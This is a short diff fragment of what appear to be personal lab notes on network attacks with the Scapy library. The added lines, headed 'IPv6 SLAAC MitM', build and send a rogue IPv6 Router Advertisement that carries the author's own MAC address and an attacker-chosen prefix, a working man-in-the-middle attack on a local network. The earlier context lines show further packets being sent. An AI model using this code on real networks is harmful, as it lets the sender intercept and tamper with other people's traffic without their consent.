@@ -28,11 +28,16 @@ sendp(z/a)
 sendp(z/b)
 
 
-
-
-
-
-
+IPv6 SLAAC MitM
+a=IPv6()
+b=ICMPv6ND_RA()
+c=ICMPv6NDOptSrcLLAddr()
+c.lladdr="fa:16:3e:a2:90:c8" (My MAC)
+d=ICMPv6NDOptMTU()
+e=ICMPv6NDOptPrefixInfo()
+e.prefix="fd00:deaf:cafe::" (Given target)
+e.prefixlen=64
+send(a/b/c/d/e)
 
 
 
